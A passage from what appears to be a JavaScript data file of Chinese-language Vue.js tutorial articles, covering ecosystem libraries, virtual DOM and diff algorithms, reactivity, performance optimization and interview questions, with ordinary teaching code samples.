- Ant Design Vue：Ant Design Vue是Ant Design的Vue实现，由蚂蚁金服团队开发，提供企业级UI组件库，组件设计遵循Ant Design设计规范，适合构建中后台系统，提供了完整的数据展示、表单、导航、反馈等组件，支持Tree Shaking按需加载
- Vuetify：Vuetify是Material Design风格的Vue UI框架，提供丰富的Material Design组件，支持Vue 2和Vue 3，组件外观美观、功能完善，提供了预制主题和自定义主题功能，适合需要Material Design风格的项目，是Vue生态中最流行的UI框架之一
- Quasar：Quasar是功能丰富的Vue框架，可以同时构建响应式网站、PWA、移动应用、桌面应用，一套代码多端部署，提供了大量高质量组件，详尽的文档和活跃的社区，支持Material Design和iOS风格主题，适合需要跨平台的项目
- Naive UI：Naive UI是Vue 3的UI组件库，组件设计现代简约，TypeScript友好，提供了完善的主题定制功能，组件体积适中，性能良好，文档清晰易读，适合需要简洁美观UI的Vue 3项目

**表单处理：**
- VeeValidate：VeeValidate是Vue生态中流行的表单验证库，支持Vue 2和Vue 3，提供了声明式的验证规则定义，可以与Yup配合使用，组件化和Hook两种使用方式，提供了Form、Field、ErrorMessage等组件，支持自定义验证规则，是Vue表单验证的常用选择
- Element Plus 表单：Element Plus提供了完整的表单组件和验证功能，包括Form、FormItem、Input、Select等组件，支持响应式布局、动态表单、表单验证等特性，验证规则可以与Async Validator配合使用，是使用Element Plus构建表单的便捷方式
- FormKit：FormKit是Vue 3的表单框架，提供了完整的表单解决方案，包括表单生成、表单验证、错误处理等功能，提供了useForm、useField等Composable，TypeScript支持完善，支持多种输入类型和自定义输入组件，是现代Vue表单开发的新选择

**动画库：**
- Vue Transition：Vue内置的过渡组件，提供CSS过渡和动画支持，通过transition组件包裹元素实现进入、离开、列表过渡效果，支持自定义CSS类名、JavaScript钩子函数，可以创建简单的淡入淡出、滑动等动画效果，是Vue最基础的动画解决方案
- Vueuse Motion：VueUse是Vue 3的组合式工具库，Vueuse Motion是其动画模块，提供声明式的动画API，基于VueUse的Composable设计，支持手势动画、滚动动画、列表动画等，可以与Vue Transition配合使用，适合需要复杂交互动画的Vue项目
- Lottie Vue：Lottie Vue是Airbnb Lottie动画库的Vue实现，可以在Vue项目中播放After Effects导出的JSON动画，提供lottie-vue-next（Vue 3）和vue-lottie（Vue 2）两个版本，支持动画播放控制、循环、速度调节等功能，适合需要高质量动画效果的Vue项目

**HTTP 客户端：**
- Axios：Axios是基于Promise的HTTP客户端，可以在浏览器和Node.js中使用，提供简洁的API支持GET、POST等HTTP方法，自动转换JSON数据，支持请求和响应拦截器、取消请求、超时处理等功能，是Vue项目中最常用的HTTP客户端库，可以与Vue的请求库如vue-resource配合或单独使用
- Fetch API：Fetch API是浏览器原生提供的HTTP请求API，基于Promise设计，支持Request和Response对象，可以进行更细粒度的请求控制，Fetch API是现代浏览器标准API，不需要额外引入库，但在某些场景下功能不如Axios丰富（如请求取消），可以使用Fetch API配合Vue的async/await语法进行数据请求
- TanStack Query：TanStack Query（之前叫Vue Query）是Vue的数据请求和缓存管理库，提供声明式的数据获取、缓存、轮询、乐观更新等功能，自动管理请求状态和缓存，支持后台刷新、预取、并行请求等高级特性，大大简化了Vue中的数据请求逻辑，是Vue项目数据管理的有力工具

### 构建工具

**Webpack：**
- 传统构建工具
- 强大的配置
- 生态丰富

**Rollup：**
- 适合库构建
-  tree-shaking
- 更小的包体积

**ESBuild：**
- 极快的构建速度
- 由 Go 语言编写
- 用于开发环境

### 部署工具

**Vercel：**
- 静态网站托管
- 自动部署
- 预览环境

**Netlify：**
- 静态网站托管
- 持续部署
- 表单处理

**GitHub Pages：**
- 免费托管
- 与 GitHub 集成
- 适合静态网站

### 最佳实践

- 使用 Vite 进行开发
- 选择合适的 UI 库
- 集成 TypeScript
- 配置 ESLint 和 Prettier
- 建立 CI/CD 流程
- 监控和分析性能
- 持续学习生态新特性`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"vue-advanced-features",title:"Vue 高级特性与核心原理",category:"vue",difficulty:"hard",tags:["Vue","高级特性","虚拟 DOM","Diff 算法"],content:`## Vue 高级特性与核心原理

Vue.js 作为现代前端框架，拥有许多强大的高级特性。深入理解这些特性对于掌握 Vue 至关重要，也是面试中的高频考点。

### 虚拟 DOM 与 Diff 算法

**虚拟 DOM 原理：**
虚拟 DOM（Virtual DOM）是 Vue 的核心机制之一，它是一个用 JavaScript 对象来描述真实 DOM 树的结构。当数据变化时，Vue 不会直接操作真实 DOM，而是先在内存中创建新的虚拟 DOM 树，然后与旧的虚拟 DOM 树进行对比（Diff），找出最小的变更集合，最后批量更新到真实 DOM 上。这种方式可以大大减少 DOM 操作次数，提高性能。

虚拟 DOM 的优势在于：
1. 跨平台能力：虚拟 DOM 不依赖于浏览器，可以在 Node.js、移动端等环境运行
2. 性能优化：通过 Diff 算法减少不必要的 DOM 操作
3. 可预测性：数据驱动视图，状态变化可追踪

\`\`\`javascript
// 虚拟 DOM 节点结构
const vnode = {
  tag: 'div',
  props: {
    id: 'app',
    class: 'container'
  },
  children: [
    {
      tag: 'h1',
      props: {},
      children: [{ text: 'Hello Vue' }]
    },
    {
      tag: 'p',
      props: { class: 'description' },
      children: [{ text: 'Virtual DOM Example' }]
    }
  ]
};

// 渲染函数
function render(vnode) {
  const el = document.createElement(vnode.tag);
  
  // 设置属性
  if (vnode.props) {
    Object.keys(vnode.props).forEach(key => {
      el.setAttribute(key, vnode.props[key]);
    });
  }
  
  // 处理子节点
  if (vnode.children) {
    vnode.children.forEach(child => {
      if (child.text) {
        el.appendChild(document.createTextNode(child.text));
      } else {
        el.appendChild(render(child));
      }
    });
  }
  
  return el;
}
\`\`\`

**Diff 算法原理：**
Vue 的 Diff 算法采用了同层比较策略，时间复杂度为 O(n)。核心思想是通过 key 来追踪节点身份，尽可能复用现有 DOM 节点。Vue 3 在 Vue 2 的基础上进行了优化，引入了编译时优化和更高效的 Diff 策略。

Diff 算法的核心步骤：
1. 同层比较：只比较同一层级的节点
2. Key 优化：通过 key 快速定位可复用节点
3. 双端比较：Vue 2 使用双端指针比较
4. 最长递增子序列：Vue 3 使用 LIS 算法优化节点移动

\`\`\`javascript
// 简化的 Diff 算法
function diff(oldVnode, newVnode) {
  // 如果节点类型不同，直接替换
  if (oldVnode.tag !== newVnode.tag) {
    return { type: 'REPLACE', node: render(newVnode) };
  }
  
  const patches = [];
  
  // 比较属性
  const propsPatches = diffProps(oldVnode.props, newVnode.props);
  if (propsPatches.length > 0) {
    patches.push({ type: 'PROPS', patches: propsPatches });
  }
  
  // 比较子节点
  const childrenPatches = diffChildren(oldVnode.children, newVnode.children);
  if (childrenPatches.length > 0) {
    patches.push({ type: 'CHILDREN', patches: childrenPatches });
  }
  
  return patches;
}

// 属性比较
function diffProps(oldProps, newProps) {
  const patches = [];
  const allProps = { ...oldProps, ...newProps };
  
  Object.keys(allProps).forEach(key => {
    if (oldProps[key] !== newProps[key]) {
      patches.push({
        key,
        oldValue: oldProps[key],
        newValue: newProps[key]
      });
    }
  });
  
  return patches;
}

// 子节点比较（简化版）
function diffChildren(oldChildren, newChildren) {
  const patches = [];
  const maxLength = Math.max(oldChildren.length, newChildren.length);
  
  for (let i = 0; i < maxLength; i++) {
    const oldChild = oldChildren[i];
    const newChild = newChildren[i];
    
    if (!oldChild) {
      patches.push({ type: 'ADD', index: i, node: newChild });
    } else if (!newChild) {
      patches.push({ type: 'REMOVE', index: i });
    } else {
      const childPatch = diff(oldChild, newChild);
      if (childPatch) {
        patches.push({ type: 'UPDATE', index: i, patch: childPatch });
      }
    }
  }
  
  return patches;
}
\`\`\`

**Vue 3 的编译时优化：**
Vue 3 引入了编译时优化，在编译阶段就标记出静态节点和动态节点，运行时可以跳过静态节点的比较。主要优化包括：

1. 静态节点提升（Static Hoisting）：静态节点提升到渲染函数外部
2. 补丁标志（Patch Flags）：标记动态内容类型
3. 缓存事件处理函数：避免重复创建
4. 树结构拍平（Tree Flattening）：优化静态子树

\`\`\`javascript
// Vue 2 编译结果
function render() {
  return h('div', { id: 'app' }, [
    h('h1', {}, this.title), // 动态内容
    h('p', { class: 'static' }, 'Static text') // 静态内容也要比较
  ]);
}

// Vue 3 编译结果（带优化）
const _hoisted_1 = h('p', { class: 'static' }, 'Static text');

function render() {
  return h('div', { id: 'app' }, [
    h('h1', {}, this.title), // 动态内容
    _hoisted_1 // 静态节点直接复用
  ]);
}
\`\`\`

### 响应式系统深度解析

**Vue 2 响应式局限性：**
Vue 2 使用 Object.defineProperty 实现响应式，存在以下局限性：
1. 无法检测对象属性的添加或删除
2. 无法检测数组索引和长度的变化
3. 初始化时需要递归遍历所有属性，性能开销大

\`\`\`javascript
// Vue 2 响应式问题示例
const vm = new Vue({
  data: {
    obj: { a: 1 },
    arr: [1, 2, 3]
  }
});

// 以下操作不会触发视图更新
vm.obj.b = 2; // 新增属性
delete vm.obj.a; // 删除属性
vm.arr[0] = 100; // 修改数组索引
vm.arr.length = 2; // 修改数组长度

// 解决方案
Vue.set(vm.obj, 'b', 2); // 添加响应式属性
Vue.delete(vm.obj, 'a'); // 删除响应式属性
vm.arr.splice(0, 1, 100); // 响应式修改数组
\`\`\`

**Vue 3 Proxy 的优势：**
Vue 3 使用 Proxy 实现响应式，解决了 Vue 2 的所有问题：
1. 可以检测属性的添加和删除
2. 可以检测数组索引和长度的变化
3. 懒代理，只有访问时才递归代理，性能更好
4. 支持 Map、Set、WeakMap、WeakSet 等数据结构

\`\`\`javascript
// Vue 3 Proxy 响应式
function createReactive(target, isReadonly = false) {
  return new Proxy(target, {
    get(target, key, receiver) {
      // 依赖收集
      track(target, key);
      const result = Reflect.get(target, key, receiver);
      
      // 懒代理：只有访问时才代理
      if (typeof result === 'object' && result !== null) {
        return createReactive(result, isReadonly);
      }
      
      return result;
    },
    set(target, key, value, receiver) {
      if (isReadonly) {
        console.warn('Cannot set on readonly object');
        return true;
      }
      
      const oldValue = target[key];
      const result = Reflect.set(target, key, value, receiver);
      
      // 派发更新
      if (oldValue !== value) {
        trigger(target, key);
      }
      
      return result;
    },
    deleteProperty(target, key) {
      const result = Reflect.deleteProperty(target, key);
      trigger(target, key);
      return result;
    },
    has(target, key) {
      track(target, key);
      return Reflect.has(target, key);
    },
    ownKeys(target) {
      track(target, 'iterate');
      return Reflect.ownKeys(target);
    }
  });
}

// 使用示例
const state = createReactive({
  obj: { a: 1 },
  arr: [1, 2, 3]
});

// 以下操作都会触发视图更新
state.obj.b = 2; // ✅ 新增属性
delete state.obj.a; // ✅ 删除属性
state.arr[0] = 100; // ✅ 修改数组索引
state.arr.length = 2; // ✅ 修改数组长度
\`\`\`

### 组件通信高级模式

**跨层级通信：**
除了 props 和 emit，Vue 还提供了多种跨层级通信方式：

1. provide/inject：祖先组件向后代组件注入数据
2. $attrs/$listeners：传递属性和事件
3. $parent/$children：访问父/子组件实例
4. ref：直接访问组件实例

\`\`\`vue
<!-- provide/inject 示例 -->
<!-- 祖先组件 -->
<script>
export default {
  provide() {
    return {
      theme: this.theme,
      updateTheme: this.updateTheme
    };
  },
  data() {
    return {
      theme: 'light'
    };
  },
  methods: {
    updateTheme(newTheme) {
      this.theme = newTheme;
    }
  }
};
</script>

<!-- 后代组件 -->
<script>
export default {
  inject: ['theme', 'updateTheme'],
  methods: {
    toggleTheme() {
      this.updateTheme(this.theme === 'light' ? 'dark' : 'light');
    }
  }
};
</script>
\`\`\`

**作用域插槽高级模式：**
作用域插槽允许父组件访问子组件的数据，实现更灵活的组件组合。

\`\`\`vue
<!-- 子组件：DataTable -->
<template>
  <table>
    <thead>
      <tr>
        <th v-for="column in columns" :key="column.key">
          {{ column.label }}
        </th>
      </tr>
    </thead>
    <tbody>
      <tr v-for="row in data" :key="row.id">
        <td v-for="column in columns" :key="column.key">
          <slot :name="column.key" :row="row" :value="row[column.key]">
            {{ row[column.key] }}
          </slot>
        </td>
      </tr>
    </tbody>
  </table>
</template>

<script>
export default {
  props: {
    columns: Array,
    data: Array
  }
};
</script>

<!-- 父组件：使用作用域插槽 -->
<template>
  <DataTable :columns="columns" :data="users">
    <template #name="{ row, value }">
      <router-link :to="'/user/' + row.id">{{ value }}</router-link>
    </template>
    
    <template #email="{ value }">
      <a :href="'mailto:' + value">{{ value }}</a>
    </template>
    
    <template #actions="{ row }">
      <button @click="editUser(row)">编辑</button>
      <button @click="deleteUser(row)">删除</button>
    </template>
  </DataTable>
</template>
\`\`\`

### 异步组件与懒加载

**异步组件：**
异步组件可以按需加载组件，减少初始包体积。

\`\`\`javascript
// Vue 2 异步组件
Vue.component('async-component', function(resolve, reject) {
  // 特殊 require() 告诉 webpack
  // 自动将构建的代码分割成单独的包
  require(['./my-component.vue'], resolve);
});

// Vue 3 异步组件
import { defineAsyncComponent } from 'vue';

const AsyncComponent = defineAsyncComponent(() =>
  import('./components/MyComponent.vue')
);

// 带加载状态的异步组件
const AsyncComponentWithLoading = defineAsyncComponent({
  loader: () => import('./components/MyComponent.vue'),
  loadingComponent: LoadingComponent,
  errorComponent: ErrorComponent,
  delay: 200, // 延迟显示加载组件
  timeout: 3000 // 超时时间
});
\`\`\`

**路由懒加载：**
结合 Vue Router 实现路由级别的代码分割。

\`\`\`javascript
// 路由懒加载
const routes = [
  {
    path: '/home',
    component: () => import('@/views/Home.vue')
  },
  {
    path: '/about',
    component: () => import('@/views/About.vue')
  },
  {
    path: '/user/:id',
    component: () => import('@/views/User.vue'),
    // 命名 chunk
    name: 'User'
  }
];
\`\`\`

### 混入（Mixins）与组合式 API

**Mixins 的优缺点：**
Mixins 是 Vue 2 的代码复用方式，但存在一些缺点：
1. 来源不清晰：无法确定属性来自哪个 mixin
2. 命名冲突：多个 mixin 可能有相同属性
3. 参数传递复杂：需要依赖选项 API 的结构

\`\`\`javascript
// Mixin 示例
const formMixin = {
  data() {
    return {
      formData: {},
      errors: {}
    };
  },
  methods: {
    validateField(field, rules) {
      // 验证逻辑
    },
    submitForm() {
      // 提交逻辑
    }
  }
};

export default {
  mixins: [formMixin],
  data() {
    return {
      formData: { // 会覆盖 mixin 的 formData
        username: '',
        password: ''
      }
    };
  }
};
\`\`\`

**Composition API 的优势：**
Composition API 解决了 Mixins 的所有问题：
1. 来源清晰：通过导入明确来源
2. 无命名冲突：使用解构获取需要的属性
3. 参数传递简单：通过函数参数

\`\`\`javascript
// Composable 示例
// useForm.js
import { ref, reactive } from 'vue';

export function useForm(initialData = {}) {
  const formData = reactive(initialData);
  const errors = ref({});
  const isSubmitting = ref(false);
  
  function validateField(field, rules) {
    // 验证逻辑
  }
  
  async function submitForm(submitFn) {
    isSubmitting.value = true;
    try {
      await submitFn(formData);
    } catch (e) {
      errors.value = e.errors;
    } finally {
      isSubmitting.value = false;
    }
  }
  
  return {
    formData,
    errors,
    isSubmitting,
    validateField,
    submitForm
  };
}

// 组件中使用
import { useForm } from './useForm';

export default {
  setup() {
    const { formData, errors, submitForm } = useForm({
      username: '',
      password: ''
    });
    
    return {
      formData,
      errors,
      submitForm
    };
  }
};
\`\`\`

### 最佳实践

1. **虚拟 DOM 优化**：合理使用 key，避免使用 index 作为 key
2. **响应式优化**：Vue 3 优先使用 ref/reactive，避免不必要的深度响应
3. **组件通信**：优先使用 props/emit，复杂场景使用 provide/inject 或状态管理
4. **代码复用**：Vue 3 优先使用 Composables，避免 Mixins
5. **性能优化**：使用异步组件和路由懒加载减少初始包体积
`,createdAt:"2026-03-16",updatedAt:"2026-03-16"},{id:"vue-performance-optimization",title:"Vue 性能优化实战指南",category:"vue",difficulty:"hard",tags:["Vue","性能优化","渲染优化","打包优化"],content:`## Vue 性能优化实战指南

性能优化是前端开发中的永恒话题，也是面试中的高频考点。Vue 作为现代前端框架，提供了多种性能优化手段。本文将从渲染优化、代码优化、打包优化等多个维度，全面讲解 Vue 性能优化的最佳实践。

### 渲染性能优化

**v-if 与 v-show 的选择：**
v-if 和 v-show 都可以条件渲染元素，但实现机制不同，适用场景也不同。

- v-if：真正的条件渲染，条件为 false 时元素不会存在于 DOM 中
- v-show：元素始终存在于 DOM 中，只是通过 display 控制显示/隐藏

选择原则：
- 频繁切换：使用 v-show（切换开销小）
- 不常切换：使用 v-if（初始渲染开销小）
- 需要生命周期：使用 v-if（v-show 不会触发生命周期）

\`\`\`vue
<template>
  <div>
    <!-- 频繁切换，使用 v-show -->
    <div v-show="isVisible">频繁切换的内容</div>
    <button @click="isVisible = !isVisible">切换</button>
    
    <!-- 不常切换，使用 v-if -->
    <div v-if="hasPermission">需要权限的内容</div>
    
    <!-- 需要生命周期钩子，使用 v-if -->
    <ChildComponent v-if="shouldRender" />
  </div>
</template>

<script>
export default {
  data() {
    return {
      isVisible: true,
      hasPermission: false,
      shouldRender: false
    };
  }
};
</script>
\`\`\`

**v-for 与 v-if 避免同时使用：**
在 Vue 2 中，v-for 的优先级高于 v-if，这会导致性能问题。Vue 3 中 v-if 优先级高于 v-for，但最佳实践是避免同时使用。

\`\`\`vue
<!-- ❌ 不推荐：v-for 与 v-if 同时使用 -->
<template>
  <ul>
    <li v-for="item in items" v-if="item.visible" :key="item.id">
      {{ item.name }}
    </li>
  </ul>
</template>

<!-- ✅ 推荐：使用计算属性过滤 -->
<template>
  <ul>
    <li v-for="item in visibleItems" :key="item.id">
      {{ item.name }}
    </li>
  </ul>
</template>

<script>
export default {
  props: {
    items: Array
  },
  computed: {
    visibleItems() {
      return this.items.filter(item => item.visible);
    }
  }
};
</script>

<!-- ✅ 推荐：使用模板标签 -->
<template>
  <ul>
    <template v-for="item in items" :key="item.id">
      <li v-if="item.visible">
        {{ item.name }}
      </li>
    </template>
  </ul>
</template>
\`\`\`

**key 的正确使用：**
key 是 Vue 追踪节点身份的重要标识，正确使用 key 可以大大提高列表渲染性能。

\`\`\`vue
<template>
  <div>
    <!-- ❌ 不推荐：使用 index 作为 key -->
    <div v-for="(item, index) in items" :key="index">
      {{ item.name }}
    </div>
    
    <!-- ✅ 推荐：使用唯一 ID 作为 key -->
    <div v-for="item in items" :key="item.id">
      {{ item.name }}
    </div>
    
    <!-- ✅ 推荐：组合 key -->
    <div v-for="item in items" :key="item.type + '-' + item.id">
      {{ item.name }}
    </div>
  </div>
</template>
\`\`\`

**使用 Object.freeze() 优化大列表：**
对于不需要响应式的大列表，可以使用 Object.freeze() 冻结对象，避免 Vue 进行响应式转换。

\`\`\`javascript
// Vue 2
export default {
  data() {
    return {
      // ❌ 不推荐：大列表进行响应式转换开销大
      largeList: fetchData(),
      
      // ✅ 推荐：冻结对象，跳过响应式转换
      frozenList: Object.freeze(fetchData())
    };
  }
};

// Vue 3
import { shallowRef } from 'vue';

export default {
  setup() {
    return {
      // ✅ 推荐：shallowRef 只代理第一层
      largeList: shallowRef(fetchData())
    };
  }
};
\`\`\`

### 组件优化

**函数式组件：**
函数式组件没有实例，渲染开销更小，适合纯展示组件。

\`\`\`vue
<!-- Vue 2 函数式组件 -->
<template functional>
  <div :class="['btn', props.type]">
    <slot></slot>
  </div>
</template>

<script>
export default {
  functional: true,
  props: {
    type: String
  }
};
</script>

<!-- Vue 3 函数式组件 -->
<script>
export default {
  props: ['type'],
  setup(props, { slots }) {
    return () => h('div', { class: ['btn', props.type] }, slots.default());
  }
};
</script>

<!-- Vue 3.3+ 语法 -->
<script setup>
defineOptions({
  inheritAttrs: false
});
</script>

<template>
  <div :class="['btn', $attrs.type]">
    <slot></slot>
  </div>
</template>
\`\`\`

**异步组件：**
异步组件可以按需加载，减少初始包体积。

\`\`\`javascript
import { defineAsyncComponent } from 'vue';

// 基础用法
const AsyncComponent = defineAsyncComponent(() =>
  import('./components/MyComponent.vue')
);

// 带加载状态
const AsyncComponentWithLoading = defineAsyncComponent({
  loader: () => import('./components/MyComponent.vue'),
  loadingComponent: LoadingComponent,
  errorComponent: ErrorComponent,
  delay: 200,
  timeout: 3000
});
\`\`\`

**keep-alive 缓存组件：**
keep-alive 可以缓存组件实例，避免重复渲染。

\`\`\`vue
<template>
  <div>
    <keep-alive :include="['Home', 'About']" :max="10">
      <router-view />
    </keep-alive>
    
    <!-- 动态组件缓存 -->
    <keep-alive>
      <component :is="currentComponent" />
    </keep-alive>
  </div>
</template>

<script>
export default {
  data() {
    return {
      currentComponent: 'Home'
    };
  }
};
</script>
\`\`\`

### 响应式优化

**ref vs reactive 的选择：**
Vue 3 提供了 ref 和 reactive 两种响应式 API，选择合适的 API 可以提高性能。

\`\`\`javascript
import { ref, reactive, shallowRef, shallowReactive } from 'vue';

// ref：适合基本类型和小型对象
const count = ref(0);
const user = ref({ name: 'Alice' });

// reactive：适合复杂对象
const state = reactive({
  user: { name: 'Alice', age: 25 },
  settings: { theme: 'dark' }
});

// shallowRef：只代理第一层，适合大对象
const largeList = shallowRef([]);

// shallowReactive：只代理第一层
const shallowState = shallowReactive({
  list: [] // 内部不是响应式的
});
\`\`\`

**computed vs watch 的选择：**
computed 和 watch 都可以响应数据变化，但使用场景不同。

\`\`\`javascript
import { ref, computed, watch, watchEffect } from 'vue';

export default {
  setup() {
    const firstName = ref('John');
    const lastName = ref('Doe');
    
    // computed：有缓存，适合派生状态
    const fullName = computed(() => {
      console.log('computed called');
      return \`\${firstName.value} \${lastName.value}\`;
    });
    
    // watch：无缓存，适合副作用
    watch([firstName, lastName], ([newFirst, newLast], [oldFirst, oldLast]) => {
      console.log('watch called');
      // 执行副作用，如 API 调用
    });
    
    // watchEffect：自动追踪依赖
    watchEffect(() => {
      console.log('watchEffect called');
      console.log('Full name:', firstName.value, lastName.value);
    });
    
    return { fullName };
  }
};
\`\`\`

### 打包优化

**代码分割：**
通过路由懒加载和异步组件实现代码分割。

\`\`\`javascript
// 路由懒加载
const routes = [
  {
    path: '/',
    component: () => import('@/views/Home.vue')
  },
  {
    path: '/about',
    component: () => import('@/views/About.vue')
  }
];

// 动态导入
const loadComponent = (name) => {
  return () => import(\`@/components/\${name}.vue\`);
};

const Header = loadComponent('Header');
const Footer = loadComponent('Footer');
\`\`\`

**Tree Shaking：**
确保代码可以被 Tree Shaking 优化。

\`\`\`javascript
// ❌ 不推荐：导入整个库
import _ from 'lodash';
_.debounce(() => {}, 300);

// ✅ 推荐：按需导入
import { debounce } from 'lodash-es';
debounce(() => {}, 300);

// ✅ 推荐：使用插件自动导入
// vite-plugin-components
// unplugin-auto-import
\`\`\`

**Vite 构建优化：**
\`\`\`javascript
// vite.config.js
import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';

export default defineConfig({
  plugins: [vue()],
  build: {
    rollupOptions: {
      output: {
        manualChunks: {
          'vue-vendor': ['vue', 'vue-router', 'pinia'],
          'lodash-vendor': ['lodash-es']
        }
      }
    },
    chunkSizeWarningLimit: 1000
  },
  optimizeDeps: {
    include: ['vue', 'vue-router', 'pinia']
  }
});
\`\`\`

### 内存优化

**及时清理副作用：**
组件卸载时及时清理副作用，避免内存泄漏。

\`\`\`vue
<script>
import { onMounted, onUnmounted } from 'vue';

export default {
  setup() {
    let timer = null;
    let observer = null;
    
    onMounted(() => {
      // 定时器
      timer = setInterval(() => {
        console.log('tick');
      }, 1000);
      
      // IntersectionObserver
      observer = new IntersectionObserver((entries) => {
        console.log(entries);
      });
      observer.observe(document.querySelector('#target'));
    });
    
    onUnmounted(() => {
      // 清理定时器
      if (timer) {
        clearInterval(timer);
      }
      
      // 清理 Observer
      if (observer) {
        observer.disconnect();
      }
    });
  }
};
</script>
\`\`\`

**避免闭包引用：**
闭包可能引用组件实例，导致内存泄漏。

\`\`\`javascript
// ❌ 不推荐：闭包引用组件实例
export default {
  setup() {
    const state = reactive({ count: 0 });
    
    setTimeout(() => {
      // 闭包引用了 state
      state.count++;
    }, 5000);
  }
};

// ✅ 推荐：使用 onUnmounted 清理
export default {
  setup() {
    const state = reactive({ count: 0 });
    let cancelled = false;
    
    onUnmounted(() => {
      cancelled = true;
    });
    
    setTimeout(() => {
      if (!cancelled) {
        state.count++;
      }
    }, 5000);
  }
};
\`\`\`

### 性能监控

**使用 Performance API：**
\`\`\`javascript
// 测量组件渲染时间
const measureRender = (name, fn) => {
  const start = performance.now();
  fn();
  const end = performance.now();
  console.log(\`\${name} rendered in \${(end - start).toFixed(2)}ms\`);
};

// 测量 API 请求时间
const measureRequest = async (name, fn) => {
  const start = performance.now();
  const result = await fn();
  const end = performance.now();
  console.log(\`\${name} fetched in \${(end - start).toFixed(2)}ms\`);
  return result;
};
\`\`\`

**使用 Vue Devtools：**
Vue Devtools 提供了性能分析功能，可以帮助定位性能问题。

### 最佳实践总结

1. **渲染优化**：合理使用 v-if/v-show，避免 v-for 与 v-if 同时使用，正确使用 key
2. **组件优化**：使用函数式组件、异步组件、keep-alive 缓存
3. **响应式优化**：选择合适的响应式 API，合理使用 computed 和 watch
4. **打包优化**：代码分割、Tree Shaking、Vite 构建优化
5. **内存优化**：及时清理副作用，避免闭包引用
6. **性能监控**：使用 Performance API 和 Vue Devtools 监控性能
`,createdAt:"2026-03-16",updatedAt:"2026-03-16"},{id:"vue-interview-questions",title:"Vue 面试高频知识点详解",category:"vue",difficulty:"hard",tags:["Vue","面试题","高频考点","Vue2","Vue3"],content:`## Vue 面试高频知识点详解

Vue 作为最流行的前端框架之一，是前端面试中的必考内容。本文整理了 Vue 面试中的高频考点，包括 Vue2 和 Vue3 的核心概念、原理和最佳实践。

### 一、Vue 核心概念

#### 1. Vue 的响应式原理是什么？Vue2 和 Vue3 有什么区别？

**Vue2 响应式原理：**
Vue2 使用 Object.defineProperty 实现响应式系统。核心思想是通过遍历 data 选项中的所有属性，将每个属性转换为 getter/setter。当属性被访问时，触发 getter 进行依赖收集；当属性被修改时，触发 setter 派发更新。

\`\`\`javascript
// Vue2 响应式核心代码
function defineReactive(obj, key, val) {
  const dep = new Dep();
  
  Object.defineProperty(obj, key, {
    enumerable: true,
    configurable: true,
    get() {
      // 依赖收集
      if (Dep.target) {
        dep.depend();
      }
      return val;
    },
    set(newVal) {
      if (newVal === val) return;
      val = newVal;
      // 派发更新
      dep.notify();
    }
  });
}
\`\`\`

**Vue2 的局限性：**
1. 无法检测对象属性的添加或删除
2. 无法检测数组索引和长度的变化
3. 初始化时需要递归遍历所有属性，性能开销大

**Vue3 响应式原理：**
Vue3 使用 ES6 Proxy 实现响应式系统。Proxy 可以直接代理整个对象，支持数组索引检测、新增属性检测、删除属性检测等。

\`\`\`javascript
// Vue3 响应式核心代码
function reactive(target) {
  return new Proxy(target, {
    get(target, key, receiver) {
      // 依赖收集
      track(target, key);
      const result = Reflect.get(target, key, receiver);
      if (typeof result === 'object' && result !== null) {
        return reactive(result);
      }
      return result;
    },
    set(target, key, value, receiver) {
      const oldValue = target[key];
      const result = Reflect.set(target, key, value, receiver);
      if (oldValue !== value) {
        trigger(target, key);
      }
      return result;
    },
    deleteProperty(target, key) {
      const result = Reflect.deleteProperty(target, key);
      trigger(target, key);
      return result;
    }
  });
}
\`\`\`

**Vue3 的优势：**
1. 可以检测属性的添加和删除
2. 可以检测数组索引和长度的变化
3. 懒代理，只有访问时才递归代理，性能更好
4. 支持 Map、Set、WeakMap、WeakSet 等数据结构

#### 2. Vue 的生命周期有哪些？各阶段适合做什么？

**Vue2 生命周期：**
- beforeCreate：实例创建前，无法访问 data、methods
- created：实例创建后，可以访问 data、methods，适合发起 API 请求
- beforeMount：挂载前，DOM 还未渲染
- mounted：挂载后，DOM 已渲染，适合操作 DOM、初始化第三方库
- beforeUpdate：更新前，数据变化，DOM 还未更新
- updated：更新后，DOM 已更新
- beforeDestroy：销毁前，清理定时器、事件监听器
- destroyed：销毁后，实例已销毁

**Vue3 生命周期：**
- beforeCreate → setup()
- created → setup()
- beforeMount → onBeforeMount
- mounted → onMounted
- beforeUpdate → onBeforeUpdate
- updated → onUpdated
- beforeDestroy → onBeforeUnmount
- destroyed → onUnmounted

\`\`\`javascript
// Vue3 生命周期使用示例
import { 
  onBeforeMount, onMounted, 
  onBeforeUpdate, onUpdated, 
  onBeforeUnmount, onUnmounted 
} from 'vue';

export default {
  setup() {
    onBeforeMount(() => {
      console.log('挂载前');
    });
    
    onMounted(() => {
      console.log('挂载后');
    });
    
    onBeforeUpdate(() => {
      console.log('更新前');
    });
    
    onUpdated(() => {
      console.log('更新后');
    });
    
    onBeforeUnmount(() => {
      console.log('卸载前');
    });
    
    onUnmounted(() => {
      console.log('卸载后');
    });
  }
};
\`\`\`

#### 3. v-if 和 v-show 的区别是什么？

| 特性 | v-if | v-show |
|------|------|--------|
| 实现方式 | 真正的条件渲染，条件为 false 时元素不在 DOM 中 | 元素始终在 DOM 中，通过 display 控制显示/隐藏 |
| 初始渲染开销 | 低 | 高 |
| 切换开销 | 高 | 低 |
| 生命周期 | 会触发 | 不会触发 |
| 适用场景 | 不常切换 | 频繁切换 |

\`\`\`vue
<template>
  <div>
    <!-- 频繁切换，使用 v-show -->
    <div v-show="isVisible">频繁切换的内容</div>
    
    <!-- 不常切换，使用 v-if -->
    <div v-if="hasPermission">需要权限的内容</div>
  </div>
</template>
\`\`\`

### 二、组件通信

#### 4. Vue 组件通信有哪些方式？

**1. props / emit（父子组件）**

父组件通过 props 传递数据给子组件，子组件通过 emit 发送事件给父组件。

\`\`\`vue
<!-- 父组件 -->
<template>
  <ChildComponent :message="parentMessage" @child-event="handleEvent" />
</template>

<!-- 子组件 -->
<script>
export default {
  props: ['message'],
  methods: {
    sendMessage() {
      this.$emit('child-event', 'Hello from child');
    }
  }
};
</script>
\`\`\`

**2. provide / inject（跨层级通信）**

祖先组件通过 provide 提供数据，后代组件通过 inject 注入数据。

\`\`\`vue
<!-- 祖先组件 -->
<script>
export default {
  provide() {
    return {
      theme: this.theme,
      updateTheme: this.updateTheme
    };
  },
  data() {
    return { theme: 'light' };
  }
};
</script>

<!-- 后代组件 -->
<script>
export default {
  inject: ['theme', 'updateTheme']
};
</script>
